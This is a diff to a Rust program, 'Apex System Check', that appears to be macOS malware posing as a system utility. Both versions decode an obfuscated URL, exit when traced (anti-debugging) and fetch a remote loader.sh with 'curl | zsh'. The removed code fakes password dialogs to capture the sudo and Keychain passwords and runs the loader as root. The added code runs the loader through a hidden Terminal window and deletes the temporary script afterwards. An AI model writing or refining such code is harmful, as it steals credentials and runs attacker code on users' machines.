@@ -1,7 +1,6 @@
-use std::process::{Command, Stdio};
+use std::process::Command;
 use std::fs;
 use std::path::PathBuf;
-use std::io::Write;
 
 const VERSION: &str = "1.0.0";
 const APP_NAME: &str = "Apex System Check";
@@ -17,27 +16,15 @@ fn decode_url() -> String {
     ENC_URL.iter().map(|b| (b ^ 0xAA) as char).collect()
 }
 
-
 fn anti_debug() {
     unsafe {
-        let ret = libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0);
-        if ret == -1 {
+        if libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0) == -1 {
             std::process::exit(0);
         }
     }
 }
 
-fn get_password(prompt: &str) -> String {
-    let out = Command::new("osascript")
-        .args(["-e", &format!("display dialog \"{}\" with hidden answer default answer \"\"", prompt)])
-        .args(["-e", "text returned of result"])
-        .output()
-        .expect("osascript failed");
-    String::from_utf8(out.stdout).unwrap().trim().to_string()
-}
-
 fn main() {
-    
     anti_debug();
 
     let args: Vec<String> = std::env::args().collect();
@@ -50,33 +37,26 @@ fn main() {
         return;
     }
 
-    
-    let sudo_pass = get_password("Enter your sudo password");
+    let url = decode_url();
+    let full_url = format!("https://{}/loader.sh", url);
 
-    
-    let keychain_pass = get_password("Enter your Keychain password");
+  
+    let script_content = format!(
+        "#!/bin/zsh\ncurl -fsSL {} | zsh\nexit\n",
+        full_url
+    );
+    let script_path = "/tmp/apx_run.sh";
+    let _ = fs::write(script_path, script_content);
+    let _ = Command::new("chmod").args(["+x", script_path]).output();
 
-    
-    let _ = Command::new("security")
-        .args(["unlock-keychain", "-p", &keychain_pass])
-        .output();
 
-    
-    let url = format!("https://{}/loader.sh", decode_url());
-    let script = format!("curl -fsSL {} | zsh", url);
-    let mut child = Command::new("sudo")
-        .arg("-S")
-        .arg("bash")
-        .arg("-c")
-        .arg(&script)
-        .stdin(Stdio::piped())
-        .spawn()
-        .unwrap();
-    if let Some(mut stdin) = child.stdin.take() {
-        stdin.write_all(sudo_pass.as_bytes()).unwrap();
-        stdin.write_all(b"\n").unwrap();
-    }
-    child.wait().unwrap();
+    let _ = Command::new("open")
+        .args(["-a", "Terminal", "-j", "-g", script_path])
+        .spawn(); // spawn – не ждём
 
-    
-}
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+    let _ = fs::remove_file(script_path);
+
+
+} 
